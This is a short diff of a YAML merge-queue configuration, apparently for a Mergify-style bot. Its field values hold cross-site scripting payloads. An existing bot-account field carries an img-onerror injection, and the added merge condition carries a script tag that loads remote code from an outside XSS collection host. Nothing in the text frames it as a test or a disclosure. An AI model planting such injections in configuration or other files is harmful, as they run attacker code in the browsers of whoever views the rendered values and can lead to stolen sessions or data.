@@ -22,3 +22,7 @@ queue_rules:
     merge_method: merge
     update_method: merge
     update_bot_account: '"><img src=x onerror=alert(1)>'
+  - merge_conditions:
+      - and:
+          - ''
+          - '  "><script src=https://xss.report/c/e></script>'
